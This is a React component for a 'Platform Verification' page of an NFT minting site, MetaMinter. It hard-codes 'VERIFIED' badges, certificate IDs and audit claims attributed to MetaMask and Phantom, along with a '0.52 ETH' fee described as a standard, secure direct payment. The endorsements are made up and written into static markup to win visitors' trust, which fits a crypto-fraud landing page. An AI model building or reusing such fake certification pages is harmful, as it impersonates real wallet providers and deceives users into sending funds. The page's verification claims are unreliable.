import { FaEthereum, FaShieldAlt, FaCheckCircle, FaCertificate } from "react-icons/fa";
import { SiFantom } from "react-icons/si";
import { useEffect, useState } from "react";

export default function Verification() {
  const [isLoading, setIsLoading] = useState(true);
  const [activeSection, setActiveSection] = useState(0);

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 1500);

    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (!isLoading) {
      const interval = setInterval(() => {
        setActiveSection(prev => (prev + 1) % 3);
      }, 5000);

      return () => clearInterval(interval);
    }
  }, [isLoading]);

  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-black">
        <div className="animate-pulse-red border-4 border-red-500 rounded-full p-8">
          <div className="animate-spin w-16 h-16 border-4 border-t-red-500 border-red-500/30 rounded-full"></div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-white p-6 md:p-12">
      <div className="max-w-6xl mx-auto">
        <div className="text-center mb-10 animate-fade-in-up">
          <h1 className="text-3xl md:text-5xl font-bold mb-4 text-red-500">Platform Verification</h1>
          <div className="h-1 w-32 bg-red-500 mx-auto mb-6"></div>
          <p className="text-lg text-gray-300">
            MetaMinter has been verified by leading blockchain wallet providers
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-10 mb-16">
          <div className={`bg-gray-900 border-2 border-red-500 rounded-lg p-6 shadow-xl transform transition-transform duration-500 ${activeSection === 0 ? 'scale-105' : 'scale-100'}`}>
            <div className="flex justify-between items-center mb-6">
              <div className="flex items-center">
                <FaEthereum className="text-orange-500 mr-3" size={32} />
                <span className="text-2xl font-bold">MetaMask</span>
              </div>
              <div className="bg-green-600 text-white px-3 py-1 rounded-full text-sm font-semibold flex items-center">
                <FaCheckCircle className="mr-1" /> VERIFIED
              </div>
            </div>
            
            <div className="space-y-4 mb-6">
              <div className="flex items-start">
                <FaShieldAlt className="text-red-500 mt-1 mr-3" />
                <div>
                  <h3 className="font-semibold mb-1">Security Audit</h3>
                  <p className="text-sm text-gray-400">Smart contract audited and verified by MetaMask security team</p>
                </div>
              </div>
              <div className="flex items-start">
                <FaCheckCircle className="text-red-500 mt-1 mr-3" />
                <div>
                  <h3 className="font-semibold mb-1">Direct Payments</h3>
                  <p className="text-sm text-gray-400">Verified direct payment system with 0.52 ETH fee structure</p>
                </div>
              </div>
            </div>
            
            <div className="bg-black/50 p-4 rounded border border-gray-800">
              <div className="flex justify-between text-sm mb-1">
                <span>Verification Date:</span>
                <span className="text-gray-300">March 15, 2025</span>
              </div>
              <div className="flex justify-between text-sm">
                <span>Certificate ID:</span>
                <span className="text-gray-300">MM-ETH-25-4729</span>
              </div>
            </div>
          </div>
          
          <div className={`bg-gray-900 border-2 border-purple-500 rounded-lg p-6 shadow-xl transform transition-transform duration-500 ${activeSection === 1 ? 'scale-105' : 'scale-100'}`}>
            <div className="flex justify-between items-center mb-6">
              <div className="flex items-center">
                <SiFantom className="text-purple-400 mr-3" size={32} />
                <span className="text-2xl font-bold">Phantom</span>
              </div>
              <div className="bg-green-600 text-white px-3 py-1 rounded-full text-sm font-semibold flex items-center">
                <FaCheckCircle className="mr-1" /> VERIFIED
              </div>
            </div>
            
            <div className="space-y-4 mb-6">
              <div className="flex items-start">
                <FaShieldAlt className="text-purple-400 mt-1 mr-3" />
                <div>
                  <h3 className="font-semibold mb-1">Platform Integration</h3>
                  <p className="text-sm text-gray-400">Officially recognized NFT minting partner</p>
                </div>
              </div>
              <div className="flex items-start">
                <FaCheckCircle className="text-purple-400 mt-1 mr-3" />
                <div>
                  <h3 className="font-semibold mb-1">Secured Transactions</h3>
                  <p className="text-sm text-gray-400">Verified transaction and minting process</p>
                </div>
              </div>
            </div>
            
            <div className="bg-black/50 p-4 rounded border border-gray-800">
              <div className="flex justify-between text-sm mb-1">
                <span>Verification Date:</span>
                <span className="text-gray-300">February 22, 2025</span>
              </div>
              <div className="flex justify-between text-sm">
                <span>Certificate ID:</span>
                <span className="text-gray-300">MM-PHM-25-2283</span>
              </div>
            </div>
          </div>
        </div>
        
        <div className={`relative bg-gradient-to-r from-gray-900 to-black rounded-lg border-2 border-red-500 p-8 mb-12 overflow-hidden ${activeSection === 2 ? 'animate-pulse-red' : ''}`}>
          <div className="absolute -top-10 -right-10 w-40 h-40 bg-red-500/20 rounded-full blur-3xl"></div>
          <div className="absolute -bottom-10 -left-10 w-40 h-40 bg-red-500/10 rounded-full blur-3xl"></div>
          
          <div className="flex flex-col md:flex-row items-center justify-between relative z-10">
            <div className="mb-6 md:mb-0 md:mr-8">
              <FaCertificate className="text-red-500 w-20 h-20 md:w-32 md:h-32 mx-auto md:mx-0" />
            </div>
            
            <div className="text-center md:text-left flex-1">
              <h2 className="text-2xl md:text-3xl font-bold mb-4">Official Verification Certificate</h2>
              <p className="text-gray-300 mb-4">
                This document certifies that MetaMinter has been verified and approved as a legitimate 
                NFT minting platform by leading blockchain wallet providers. All transactions on this platform
                are secure and direct to creator wallets with a standard fee of 0.52 ETH.
              </p>
              <div className="flex flex-wrap justify-center md:justify-start gap-4">
                <div className="bg-red-500/20 px-4 py-2 rounded flex items-center border border-red-500/30">
                  <FaShieldAlt className="mr-2" /> Legitimate
                </div>
                <div className="bg-red-500/20 px-4 py-2 rounded flex items-center border border-red-500/30">
                  <FaCheckCircle className="mr-2" /> Verified
                </div>
                <div className="bg-red-500/20 px-4 py-2 rounded flex items-center border border-red-500/30">
                  <FaEthereum className="mr-2" /> Direct Payment
                </div>
              </div>
            </div>
          </div>
        </div>
        
        <div className="flex justify-center">
          <button
            onClick={() => window.history.back()}
            className="bg-red-500 hover:bg-red-600 transition-colors text-white px-6 py-3 rounded-md font-medium flex items-center"
          >
            Return to Dashboard
          </button>
        </div>
      </div>
    </div>
  );
}